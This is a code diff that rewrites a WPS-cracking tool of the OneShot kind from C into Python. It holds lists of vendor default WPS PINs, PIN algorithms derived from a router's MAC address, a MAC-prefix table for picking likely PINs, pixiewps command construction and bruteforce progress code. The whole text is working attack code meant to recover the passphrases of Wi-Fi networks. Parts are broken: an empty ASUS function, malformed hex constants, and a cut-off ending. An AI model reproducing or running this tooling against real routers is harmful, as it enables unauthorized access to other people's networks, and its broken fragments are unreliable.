@@ -1,1313 +1,1205 @@
-#include <getopt.h>
-#include <stdio.h>
-#include <limits.h>
-#include <unistd.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <sys/socket.h>
-#include <sys/un.h>
-#include <stdlib.h>
-#include <time.h>
-#include <string.h>
-#include <inttypes.h>
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# Modify History : rofl0r => FARHAN => Mohammad_Alamin (Toxinum) (FARHAN)
+# VERSION 1.0.1
+# Open Source Code.No Need More Modification.
+import sys, subprocess, os, tempfile, shutil, re, codecs, socket, pathlib, time, collections, statistics, collections, csv, http.client, marshal
+from time import sleep 
+from datetime import datetime
+from typing import Dict
+now = datetime.now()
+now_time = str(now.strftime("%d:%m:%Y - %H:%M:%S"))
+def ani(z):
+	for e in z + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(0.004)
 
-#ifndef P_tmpdir
-#define P_tmpdir "/tmp"
-#endif
+class NetworkAddress:
+    def __init__(self, mac):
+        if isinstance(mac, int):
+            self._int_repr = mac
+            self._str_repr = self._int2mac(mac)
+        elif isinstance(mac, str):
+            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
+            self._int_repr = self._mac2int(mac)
+        else:
+            raise ValueError('[\033[1;31m!\033[1;37m] MAC address must be string or integer')
 
-extern FILE *popen (const char *command, const char *modes);
-extern int pclose (FILE *stream);
+    @property
+    def string(self):
+        return self._str_repr
 
-typedef unsigned long long int mac_t;
-typedef unsigned int pin_t;
-#define NO_MAC -1ull
-#define NO_PIN -1u
-#define EMPTY_PIN -2u
+    @string.setter
+    def string(self, value):
+        self._str_repr = value
+        self._int_repr = self._mac2int(value)
 
-unsigned char mac_byte(mac_t mac,int byte) {
-	return (mac>>(8*byte)) & 0xFF;
-}
-mac_t str2mac(const char *str) {
-	mac_t mac=0x0;
-	while(*str!='\0') {
-		if(*str>='A' && *str<='F') {
-			mac<<=4; /* 1/2 of byte */
-			mac+=(*str-'A'+0xA);
-		} else if(*str>='a' && *str<='f') {
-			mac<<=4;
-			mac+=(*str-'a'+0xA);
-		} else if(*str>='0' && *str<='9') {
-			mac<<=4;
-			mac+=(*str-'0');
-		} else if(*str!=':')
-			return NO_MAC;
-		str++;
-	}
-	return mac;
-}
-const char *mac2str(mac_t mac) {
-	static char str[18];
-	unsigned char b[6];
-	int byte;
-	for(byte=0; byte<6; byte++)
-		b[byte]=mac_byte(mac,byte);
-	sprintf(str,"%02X:%02X:%02X:%02X:%02X:%02X",
-	             b[5],b[4],b[3],b[2],b[1],b[0]);
-	return str;
-}
+    @property
+    def integer(self):
+        return self._int_repr
 
-pin_t checksum(pin_t pin) {
-	int accum=0;
-	while(pin) {
-		accum+=(3*(pin%10));
-		pin/=10;
-		accum+=(pin%10);
-		pin/=10;
-	}
-	return ((10-accum%10)%10);
-}
+    @integer.setter
+    def integer(self, value):
+        self._int_repr = value
+        self._str_repr = self._int2mac(value)
 
-pin_t pin24(mac_t mac) {
-	return mac & 0xFFFFFF;
-}
-pin_t pin28(mac_t mac) {
-	return mac & 0xFFFFFFF;
-}
-pin_t pin32(mac_t mac) {
-	return mac % 0x100000000;
-}
-pin_t pinDLink(mac_t mac) {
-	pin_t nic = pin24(mac);
-	pin_t pin = nic ^ 0x55AA55;
-	pin ^= (((pin & 0xF) << 4) +
-			((pin & 0xF) << 8) +
-			((pin & 0xF) << 12) +
-			((pin & 0xF) << 16) +
-			((pin & 0xF) << 20));
-	pin%=1000000;
-	if(pin<100000)
-		pin+=((pin%9+1)*100000);
-	return pin;
-}
-pin_t pinDLink1(mac_t mac) {
-	return pinDLink(mac+1);
-}
-pin_t pinASUS(mac_t mac) {
+    def __int__(self):
+        return self.integer
 
-}
-pin_t pinAirocon(mac_t mac) {
-	unsigned char b[6];
-	int byte;
-	for(byte=0; byte<6; byte++)
-		b[byte]=mac_byte(mac,byte);
-	pin_t pin=
-		(((b[0] + b[1]) % 10) * 1) +
-		(((b[5] + b[0]) % 10) * 10) +
-		(((b[4] + b[5]) % 10) * 100) +
-		(((b[3] + b[4]) % 10) * 1000) +
-		(((b[2] + b[3]) % 10) * 10000) +
-		(((b[1] + b[2]) % 10) * 100000) +
-		(((b[0] + b[1]) % 10) * 1000000);
-	return pin;
+    def __str__(self):
+        return self.string
 
-}
+    def __iadd__(self, other):
+        self.integer += other
 
-typedef struct {
-	const char *name;
-	pin_t static_pin;
-	pin_t (*gen)(mac_t mac);
-} algo_t;
+    def __isub__(self, other):
+        self.integer -= other
 
-const algo_t algorithms[]= {
-	{"Empty",				EMPTY_PIN,	NULL},
-	{"24-bit PIN",			NO_PIN,		pin24},
-	{"28-bit PIN",			NO_PIN,		pin28},
-	{"32-bit PIN",			NO_PIN,		pin32},
-	{"D-Link PIN",			NO_PIN,		pinDLink},
-	{"D-Link PIN +1",		NO_PIN,		pinDLink1},
-	{"ASUS PIN",			NO_PIN,		pinASUS},
-	{"Airocon Realtek",		NO_PIN,		pinAirocon},
+    def __eq__(self, other):
+        return self.integer == other.integer
 
-	{"Cisco",				1234567,	NULL},
-	{"Broadcom 1",			2017252,	NULL},
-	{"Broadcom 2",			4626484,	NULL},
-	{"Broadcom 3",			7622990,	NULL},
-	{"Broadcom 4",			6232714,	NULL},
-	{"Broadcom 5",			1086411,	NULL},
-	{"Broadcom 6",			3195719,	NULL},
-	{"Aircocon 1",			3043203,	NULL},
-	{"Aircocon 2",			7141225,	NULL},
-	{"DSL-2740R",			6817554,	NULL},
-	{"Realtek 1",			9566146,	NULL},
-	{"Realtek 2",			9571911,	NULL},
-	{"Realtek 3",			4856371,	NULL},
-	{"Upvel",				2085483,	NULL},
-	{"UR-814AC",			4397768,	NULL},
-	{"UR-825AC",			529417,		NULL},
-	{"Onlime",				9995604,	NULL},
-	{"Edimax",				3561153,	NULL},
-	{"Thomson",				6795814,	NULL},
-	{"HG532x",				3425928,	NULL},
-	{"H108L",				9422988,	NULL},
-	{"CBN ONO",				9575521,	NULL},
-};
-#define PIN_TYPES_COUNT 30
+    def __ne__(self, other):
+        return self.integer != other.integer
 
-pin_t generate_pin(int algo,mac_t mac) {
-	pin_t pin;
-	if(algorithms[algo].gen)
-		pin=algorithms[algo].gen(mac);
-	else
-		pin=algorithms[algo].static_pin;
-	pin=pin%10000000*10+checksum(pin);
-	return pin;
-}
-int matches(mac_t mac, mac_t _mask) {
-	int byte;
-	for(byte=6; byte>=0; byte--) {
-		if(mac_byte(_mask,byte)==0xFF) {
-			mac_t shift=mac>>(8*(6-byte));
-			mac_t mask=_mask & ~(0xFF<<(byte*8));
-			return shift==mask;
-		}
-	}
-	return 0;
-}
-unsigned long long int suggest(mac_t mac) {
-	const mac_t masks[][256]= {
-		{0xFFE46F13, 0xFFEC2280, 0xFF58D56E, 0xFF1062EB, 0xFF10BEF5, 0xFF1C5F2B, 0xFF802689, 0xFFA0AB1B, 0xFF74DADA, 0xFF9CD643, 0xFF68A0F6, 0xFF0C96BF, 0xFF20F3A3, 0xFFACE215, 0xFFC8D15E, 0xFF000E8F, 0xFFD42122, 0xFF3C9872, 0xFF788102, 0xFF7894B4, 0xFFD460E3, 0xFFE06066, 0xFF004A77, 0xFF2C957F, 0xFF64136C, 0xFF74A78E, 0xFF88D274, 0xFF702E22, 0xFF74B57E, 0xFF789682, 0xFF7C3953, 0xFF8C68C8, 0xFFD476EA, 0xFF344DEA, 0xFF38D82F, 0xFF54BE53, 0xFF709F2D, 0xFF94A7B7, 0xFF981333, 0xFFCAA366, 0xFFD0608C, 0x0},
-		{0xFF04BF6D, 0xFF0E5D4E, 0xFF107BEF, 0xFF14A9E3, 0xFF28285D, 0xFF2A285D, 0xFF32B2DC, 0xFF381766, 0xFF404A03, 0xFF4E5D4E, 0xFF5067F0, 0xFF5CF4AB, 0xFF6A285D, 0xFF8E5D4E, 0xFFAA285D, 0xFFB0B2DC, 0xFFC86C87, 0xFFCC5D4E, 0xFFCE5D4E, 0xFFEA285D, 0xFFE243F6, 0xFFEC43F6, 0xFFEE43F6, 0xFFF2B2DC, 0xFFFCF528, 0xFFFEF528, 0xFF4C9EFF, 0xFF0014D1, 0xFFD8EB97, 0xFF1C7EE5, 0xFF84C9B2, 0xFFFC7516, 0xFF14D64D, 0xFF9094E4, 0xFFBCF685, 0xFFC4A81D, 0xFF00664B, 0xFF087A4C, 0xFF14B968, 0xFF2008ED, 0xFF346BD3, 0xFF4CEDDE, 0xFF786A89, 0xFF88E3AB, 0xFFD46E5C, 0xFFE8CD2D, 0xFFEC233D, 0xFFECCB30, 0xFFF49FF3, 0xFF20CF30, 0xFF90E6BA, 0xFFE0CB4E, 0xFFD4BF7F4, 0xFFF8C091, 0xFF001CDF, 0xFF002275, 0xFF08863B, 0xFF00B00C, 0xFF081075, 0xFFC83A35, 0xFF0022F7, 0xFF001F1F, 0xFF00265B, 0xFF68B6CF, 0xFF788DF7, 0xFFBC1401, 0xFF202BC1, 0xFF308730, 0xFF5C4CA9, 0xFF62233D, 0xFF623CE4, 0xFF623DFF, 0xFF6253D4, 0xFF62559C, 0xFF626BD3, 0xFF627D5E, 0xFF6296BF, 0xFF62A8E4, 0xFF62B686, 0xFF62C06F, 0xFF62C61F, 0xFF62C714, 0xFF62CBA8, 0xFF62CDBE, 0xFF62E87B, 0xFF6416F0, 0xFF6A1D67, 0xFF6A233D, 0xFF6A3DFF, 0xFF6A53D4, 0xFF6A559C, 0xFF6A6BD3, 0xFF6A96BF, 0xFF6A7D5E, 0xFF6AA8E4, 0xFF6AC06F, 0xFF6AC61F, 0xFF6AC714, 0xFF6ACBA8, 0xFF6ACDBE, 0xFF6AD15E, 0xFF6AD167, 0xFF721D67, 0xFF72233D, 0xFF723CE4, 0xFF723DFF, 0xFF7253D4, 0xFF72559C, 0xFF726BD3, 0xFF727D5E, 0xFF7296BF, 0xFF72A8E4, 0xFF72C06F, 0xFF72C61F, 0xFF72C714, 0xFF72CBA8, 0xFF72CDBE, 0xFF72D15E, 0xFF72E87B, 0xFF0026CE, 0xFF9897D1, 0xFFE04136, 0xFFB246FC, 0xFFE24136, 0xFF00E020, 0xFF5CA39D, 0xFFD86CE9, 0xFFDC7144, 0xFF801F02, 0xFFE47CF9, 0xFF000CF6, 0xFF00A026, 0xFFA0F3C1, 0xFF647002, 0xFFB0487A, 0xFFF81A67, 0xFFF8D111, 0xFF34BA9A, 0xFFB4944E, 0x0},
-		{0xFF200BC7, 0xFF4846FB, 0xFFD46AA8, 0xFFF84ABF, 0x0},
-		{0xFF000726, 0xFFD8FEE3, 0xFFFC8B97, 0xFF1062EB, 0xFF1C5F2B, 0xFF48EE0C, 0xFF802689, 0xFF908D78, 0xFFE8CC18, 0xFF2CAB25, 0xFF10BF48, 0xFF14DAE9, 0xFF3085A9, 0xFF50465D, 0xFF5404A6, 0xFFC86000, 0xFFF46D04, 0xFF3085A9, 0xFF801F02, 0x0},
-		{0xFF14D64D, 0xFF1C7EE5, 0xFF28107B, 0xFF84C9B2, 0xFFA0AB1B, 0xFFB8A386, 0xFFC0A0BB, 0xFFCCB255, 0xFFFC7516, 0xFF0014D1, 0xFFD8EB97, 0x0},
-		{0xFF0018E7, 0xFF00195B, 0xFF001CF0, 0xFF001E58, 0xFF002191, 0xFF0022B0, 0xFF002401, 0xFF00265A, 0xFF14D64D, 0xFF1C7EE5, 0xFF340804, 0xFF5CD998, 0xFF84C9B2, 0xFFB8A386, 0xFFC8BE19, 0xFFC8D3A3, 0xFFCCB255, 0xFF0014D1, 0x0},
-		{0xFF049226, 0xFF04D9F5, 0xFF08606E, 0xFF0862669, 0xFF107B44, 0xFF10BF48, 0xFF10C37B, 0xFF14DDA9, 0xFF1C872C, 0xFF1CB72C, 0xFF2C56DC, 0xFF2CFDA1, 0xFF305A3A, 0xFF382C4A, 0xFF38D547, 0xFF40167E, 0xFF50465D, 0xFF54A050, 0xFF6045CB, 0xFF60A44C, 0xFF704D7B, 0xFF74D02B, 0xFF7824AF, 0xFF88D7F6, 0xFF9C5C8E, 0xFFAC220B, 0xFFAC9E17, 0xFFB06EBF, 0xFFBCEE7B, 0xFFC860007, 0xFFD017C2, 0xFFD850E6, 0xFFE03F49, 0xFFF0795978, 0xFFF832E4, 0xFF00072624, 0xFF0008A1D3, 0xFF00177C, 0xFF001EA6, 0xFF00304FB, 0xFF00E04C0, 0xFF048D38, 0xFF081077, 0xFF081078, 0xFF081079, 0xFF083E5D, 0xFF10FEED3C, 0xFF181E78, 0xFF1C4419, 0xFF2420C7, 0xFF247F20, 0xFF2CAB25, 0xFF3085A98C, 0xFF3C1E04, 0xFF40F201, 0xFF44E9DD, 0xFF48EE0C, 0xFF5464D9, 0xFF54B80A, 0xFF587BE906, 0xFF60D1AA21, 0xFF64517E, 0xFF64D954, 0xFF6C198F, 0xFF6C7220, 0xFF6CFDB9, 0xFF78D99FD, 0xFF7C2664, 0xFF803F5DF6, 0xFF84A423, 0xFF88A6C6, 0xFF8C10D4, 0xFF8C882B00, 0xFF904D4A, 0xFF907282, 0xFF90F65290, 0xFF94FBB2, 0xFFA01B29, 0xFFA0F3C1E, 0xFFA8F7E00, 0xFFACA213, 0xFFB85510, 0xFFB8EE0E, 0xFFBC3400, 0xFFBC9680, 0xFFC891F9, 0xFFD00ED90, 0xFFD084B0, 0xFFD8FEE3, 0xFFE4BEED, 0xFFE894F6F6, 0xFFEC1A5971, 0xFFEC4C4D, 0xFFF42853, 0xFFF43E61, 0xFFF46BEF, 0xFFF8AB05, 0xFFFC8B97, 0xFF7062B8, 0xFF78542E, 0xFFC0A0BB8C, 0xFFC412F5, 0xFFC4A81D, 0xFFE8CC18, 0xFFEC2280, 0xFFF8E903F4, 0x0},
-		{0xFF0007262F, 0xFF000B2B4A, 0xFF000EF4E7, 0xFF001333B, 0xFF00177C, 0xFF001AEF, 0xFF00E04BB3, 0xFF02101801, 0xFF0810734, 0xFF08107710, 0xFF1013EE0, 0xFF2CAB25C7, 0xFF788C54, 0xFF803F5DF6, 0xFF94FBB2, 0xFFBC9680, 0xFFF43E61, 0xFFFC8B97, 0x0},
-		{0xFF001A2B, 0xFF00248C, 0xFF002618, 0xFF344DEB, 0xFF7071BC, 0xFFE06995, 0xFFE0CB4E, 0xFF7054F5, 0x0},
-		{0xFFACF1DF, 0xFFBCF685, 0xFFC8D3A3, 0xFF988B5D, 0xFF001AA9, 0xFF14144B, 0xFFEC6264, 0x0},
-		{0xFF14D64D, 0xFF1C7EE5, 0xFF28107B, 0xFF84C9B2, 0xFFB8A386, 0xFFBCF685, 0xFFC8BE19, 0x0},
-		{0xFF14D64D, 0xFF1C7EE5, 0xFF28107B, 0xFFB8A386, 0xFFBCF685, 0xFFC8BE19, 0xFF7C034C, 0x0},
-		{0xFF14D64D, 0xFF1C7EE5, 0xFF28107B, 0xFF84C9B2, 0xFFB8A386, 0xFFBCF685, 0xFFC8BE19, 0xFFC8D3A3, 0xFFCCB255, 0xFFFC7516, 0xFF204E7F, 0xFF4C17EB, 0xFF18622C, 0xFF7C03D8, 0xFFD86CE9, 0x0},
-		{0xFF14D64D, 0xFF1C7EE5, 0xFF28107B, 0xFF84C9B2, 0xFFB8A386, 0xFFBCF685, 0xFFC8BE19, 0xFFC8D3A3, 0xFFCCB255, 0xFFFC7516, 0xFF204E7F, 0xFF4C17EB, 0xFF18622C, 0xFF7C03D8, 0xFFD86CE9, 0x0},
-		{0xFF14D64D, 0xFF1C7EE5, 0xFF28107B, 0xFF84C9B2, 0xFFB8A386, 0xFFBCF685, 0xFFC8BE19, 0xFFC8D3A3, 0xFFCCB255, 0xFFFC7516, 0xFF204E7F, 0xFF4C17EB, 0xFF18622C, 0xFF7C03D8, 0xFFD86CE9, 0x0},
-		{0xFF181E78, 0xFF40F201, 0xFF44E9DD, 0xFFD084B0, 0x0},
-		{0xFF84A423, 0xFF8C10D4, 0xFF88A6C6, 0x0},
-		{0xFF00265A, 0xFF1CBDB9, 0xFF340804, 0xFF5CD998, 0xFF84C9B2, 0xFFFC7516, 0x0},
-		{0xFF0014D1, 0xFF000C42, 0xFF000EE8, 0x0},
-		{0xFF007263, 0xFFE4BEED, 0x0},
-		{0xFF08C6B3, 0x0},
-		{0xFF784476, 0xFFD4BF7F0, 0xFFF8C091, 0x0},
-		{0xFFD4BF7F60, 0x0},
-		{0xFFD4BF7F5, 0x0},
-		{0xFFD4BF7F, 0xFFF8C091, 0xFF144D67, 0xFF784476, 0xFF0014D1, 0x0},
-		{0xFF801F02, 0xFF00E04C, 0x0},
-		{0xFF002624, 0xFF4432C8, 0xFF88F7C7, 0xFFCC03FA, 0x0},
-		{0xFF00664B, 0xFF086361, 0xFF087A4C, 0xFF0C96BF, 0xFF14B968, 0xFF2008ED, 0xFF2469A5, 0xFF346BD3, 0xFF786A89, 0xFF88E3AB, 0xFF9CC172, 0xFFACE215, 0xFFD07AB5, 0xFFCCA223, 0xFFE8CD2D, 0xFFF80113, 0xFFF83DFF, 0x0},
-		{0xFF4C09B4, 0xFF4CAC0A, 0xFF84742A4, 0xFF9CD24B, 0xFFB075D5, 0xFFC864C7, 0xFFDC028E, 0xFFFCC897, 0x0},
-		{0xFF5C353B, 0xFFDC537C, 0x0}
-	};
-	unsigned long long int bytes=0;
-	int type;
-	for(type=0; type<PIN_TYPES_COUNT; type++) {
-		const mac_t *mask;
-		for(mask=masks[type]; *mask; mask++)
-			if(matches(mac,*mask))
-				bytes|=(1<<type);
-	}
-	return bytes;
-}
-pin_t get_likely(mac_t mac) {
-	unsigned long long int bytes=suggest(mac);
-	int type;
-	for(type=0; type<PIN_TYPES_COUNT; type++)
-		if((bytes>>type)&1)
-			return generate_pin(type,mac);
-	return NO_PIN;
-}
+    def __lt__(self, other):
+        return self.integer < other.integer
 
-size_t count_lines(FILE *file) {
-	size_t lines=1;
-	while(!feof(file)) {
-		int ch = fgetc(file);
-		if(ch == '\n') {
-			lines++;
-		}
-	}
-	rewind(file);
-	return lines;
-}
+    def __gt__(self, other):
+        return self.integer > other.integer
 
-typedef struct {
-	char pke[1024];
-	char pkr[1024];
-	char authkey[256];
-	char e_hash1[256];
-	char e_hash2[256];
-	char e_nonce[128];
-} pixiewps_data_t;
-int got_all_pixieps_data(const pixiewps_data_t *data) {
-	return *data->pke!='\0' && *data->pkr!='\0' && *data->authkey!='\0' &&
-	       *data->e_hash1!='\0' && *data->e_hash2!='\0' && *data->e_nonce!='\0';
-}
-void get_pixiewps_cmd(const pixiewps_data_t *data,int full_range,char *buf) {
-	sprintf(buf,"pixiewps --pke %s --pkr %s --e-hash1 %s"
-	        " --e-hash2 %s --authkey %s --e-nonce %s %s",
-	        data->pke,data->pkr,data->e_hash1,data->e_hash2,
-	        data->authkey,data->e_nonce,full_range?"--force":"");
-}
-enum {
-	STATUS_NO,
-	STATUS_WSC_NACK,
-	STATUS_WPS_FAIL,
-	STATUS_GOT_PSK,
-	STATUS_SCANNING,
-	STATUS_AUTHENTICATING,
-	STATUS_ASSOCIATING,
-	STATUS_EAPOL_START
-};
-typedef struct {
-	int status;
-	int last_m_message;
-	char essid[256];
-	char wpa_psk[256];
-} connection_status_t;
-#define BRUTEFORCE_STATISTICS_PERIOD 5
-#define BRUTEFORCE_STATISTICS_COUNT 15
-typedef struct {
-	time_t start_time;
-	pin_t mask;
-	time_t last_attempt_time;
-	double attempts_times[BRUTEFORCE_STATISTICS_COUNT];
-	int counter;
-} bruteforce_status_t;
-void display_bruteforce_status(bruteforce_status_t *status) {
-	struct tm *timeinfo;
-	timeinfo=localtime(&status->start_time);
-	char start_time[128];
-	strftime(start_time,128,"%Y-%m-%d %H:%M:%S",timeinfo);
+    @staticmethod
+    def _mac2int(mac):
+        return int(mac.replace(':', ''), 16)
 
-	double mean=0.0;
-	int count=0;
-	size_t n;
-	for(n=0; n<BRUTEFORCE_STATISTICS_COUNT; n++) {
-		if(status->attempts_times[n]==0.0f) {
-			mean+=status->attempts_times[n];
-			count++;
-		}
-	}
-	mean/=(double)count;
+    @staticmethod
+    def _int2mac(mac):
+        mac = hex(mac).split('x')[-1].upper()
+        mac = mac.zfill(12)
+        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
+        return mac
 
-	float percent;
-	if(status->mask<10000)
-		percent=status->mask/110.0f;
-	else
-		percent=(1000.0f/11.0f)+(status->mask%10000)/110.0f;
+    def __repr__(self):
+        return 'NetworkAddress(string={}, integer={})'.format(
+            self._str_repr, self._int_repr)
 
-	printf("[*] %.2f%% complete @ %s (%.2f seconds/pin)\n",
-	        percent,start_time,mean);
-}
-void register_bruteforce_attempt(bruteforce_status_t *status, pin_t mask) {
-	status->mask=mask;
-	status->counter++;
-	time_t current_time;
-	time(&current_time);
-	double diff=difftime(current_time,status->last_attempt_time);
-	int n;
-	for(n=0; n<BRUTEFORCE_STATISTICS_COUNT-1; n++) /* shift times */
-		status->attempts_times[n]=status->attempts_times[n+1];
-	status->attempts_times[BRUTEFORCE_STATISTICS_COUNT-1]=diff;
-	if(status->counter%BRUTEFORCE_STATISTICS_PERIOD==0)
-		display_bruteforce_status(status);
-}
+class WPSpin:
+    """WPS pin generator"""
+    def __init__(self):
+        self.ALGO_MAC = 0
+        self.ALGO_EMPTY = 1
+        self.ALGO_STATIC = 2
 
-const char *get_oneshot_dir(){
-	static char dir[256] = {'\0'};
-	if(*dir=='\0')
-		sprintf(dir,"%s/.OneShot",getenv("HOME"));
-	return dir;
-}
-typedef struct{
-	int s;
-	struct sockaddr_un local;
-	struct sockaddr_un dest;
-	char tempdir[256];
-	char tempcfg[256];
-}wpa_ctrl_t;
-int wpa_ctrl_open(wpa_ctrl_t *ctrl,const char *ctrl_path){
-	static int counter=0;
-	ctrl->s=socket(PF_UNIX,SOCK_DGRAM,0);
-	if(ctrl->s<0){
-		perror("socket");
-		return -1;
-	}
-	sprintf(ctrl->local.sun_path,P_tmpdir"/wpa_ctrl_%d_%d",getpid(),counter++);
-	ctrl->local.sun_family=AF_UNIX;
-	if(bind(ctrl->s,(struct sockaddr*)&ctrl->local,sizeof(struct sockaddr_un))){
-		perror("bind");
-		return -1;
-	}
+        self.algos = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
+                      'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
+                      'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
+                      'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
+                      'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
+                      'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
+                      'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
+                      # Static pin algos
+                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
+                      'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
+                      'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
+                      'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
+                      'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
+                      'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
+                      'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
+                      'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
+                      'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
+                      'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
+                      'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
+                      'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
+                      'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
+                      'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
+                      'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
+                      'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
+                      'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
+                      'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
+                      'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
+                      'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
+                      'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
+                      'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
+                      'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}}
 
-	strcpy(ctrl->dest.sun_path,ctrl_path);
-	ctrl->dest.sun_family=AF_UNIX;
-	if(connect(ctrl->s,(struct sockaddr*)&ctrl->dest,sizeof(struct sockaddr_un))){
-		perror("connect");
-		return -1;
-	}
+    @staticmethod
+    def checksum(pin):
+        """
+        Standard WPS checksum algorithm.
+        @pin — A 7 digit pin to calculate the checksum for.
+        Returns the checksum value.
+        """
+        accum = 0
+        while pin:
+            accum += (3 * (pin % 10))
+            pin = int(pin / 10)
+            accum += (pin % 10)
+            pin = int(pin / 10)
+        return (10 - accum % 10) % 10
 
-	return 0;
-}
-void wpa_ctrl_close(wpa_ctrl_t *ctrl){
-	unlink(ctrl->local.sun_path);
-	close(ctrl->s);
-}
-int wpa_ctrl_send(wpa_ctrl_t *ctrl,const char *input){
-	if(send(ctrl->s,input,strlen(input),0)<0){
-		perror("send");
-		return -1;
-	}
-	return 0;
-}
-int wpa_ctrl_send_recv(wpa_ctrl_t *ctrl,const char *input,char *output,size_t len){
-	if(wpa_ctrl_send(ctrl,input))
-		return -1;
-	if(recv(ctrl->s,output,len,0)<0){
-		perror("recv");
-		return -1;
-	}
-	return 0;
-}
-FILE *run_wpa_supplicant(wpa_ctrl_t *ctrl,const char *interface){
-	strcpy(ctrl->tempdir,P_tmpdir"/tmpXXXXXX");
-	mkdtemp(ctrl->tempdir);
-	strcpy(ctrl->tempcfg,P_tmpdir"/tmpXXXXXX.conf");
-	mkstemps(ctrl->tempcfg,5);
+    def generate(self, algo, mac):
+        """
+        WPS pin generator
+        @algo — the WPS pin algorithm ID
+        Returns the WPS pin string value
+        """
+        mac = NetworkAddress(mac)
+        if algo not in self.algos:
+            raise ValueError('Invalid WPS pin algorithm')
+        pin = self.algos[algo]['gen'](mac)
+        if algo == 'pinEmpty':
+            return pin
+        pin = pin % 10000000
+        pin = str(pin) + str(self.checksum(pin))
+        return pin.zfill(8)
 
+    def getAll(self, mac, get_static=True):
+        """
+        Get all WPS pin's for single MAC
+        """
+        res = []
+        for ID, algo in self.algos.items():
+            if algo['mode'] == self.ALGO_STATIC and not get_static:
+                continue
+            item = {}
+            item['id'] = ID
+            if algo['mode'] == self.ALGO_STATIC:
+                item['name'] = 'Static PIN — ' + algo['name']
+            else:
+                item['name'] = algo['name']
+            item['pin'] = self.generate(ID, mac)
+            res.append(item)
+        return res
 
-	FILE *config=fopen(ctrl->tempcfg,"w");
-	fprintf(config,"ctrl_interface=%s\n"
-	               "ctrl_interface_group=root\n"
-	               "update_config=1\n",ctrl->tempdir);
-	fclose(config);
+    def getList(self, mac, get_static=True):
+        """
+        Get all WPS pin's for single MAC as list
+        """
+        res = []
+        for ID, algo in self.algos.items():
+            if algo['mode'] == self.ALGO_STATIC and not get_static:
+                continue
+            res.append(self.generate(ID, mac))
+        return res
 
+    def getSuggested(self, mac):
+        """
+        Get all suggested WPS pin's for single MAC
+        """
+        algos = self._suggest(mac)
+        res = []
+        for ID in algos:
+            algo = self.algos[ID]
+            item = {}
+            item['id'] = ID
+            if algo['mode'] == self.ALGO_STATIC:
+                item['name'] = 'Static PIN — ' + algo['name']
+            else:
+                item['name'] = algo['name']
+            item['pin'] = self.generate(ID, mac)
+            res.append(item)
+        return res
 
-	printf("[*] Running wpa_supplicant...\n");
-	char wpas_cmd[256];
-	sprintf(wpas_cmd,"wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i%s -c%s",
-		interface,ctrl->tempcfg);
-	FILE *wpas=popen(wpas_cmd,"r");
+    def getSuggestedList(self, mac):
+        """
+        Get all suggested WPS pin's for single MAC as list
+        """
+        algos = self._suggest(mac)
+        res = []
+        for algo in algos:
+            res.append(self.generate(algo, mac))
+        return res
 
-	/* Waiting for wpa_supplicant control interface initialization */
-	char wpas_ctrl_path[256];
-	sprintf(wpas_ctrl_path,"%s/%s",ctrl->tempdir,interface);
-	struct stat dir_info;
-	while(stat(wpas_ctrl_path, &dir_info));
+    def getLikely(self, mac):
+        res = self.getSuggestedList(mac)
+        if res:
+            return res[0]
+        else:
+            return None
 
-	wpa_ctrl_open(ctrl,wpas_ctrl_path);
-	return wpas;
-}
-
-typedef struct{
-	const char *interface;
-	char sessions_dir[256];
-	char pixiewps_dir[256];
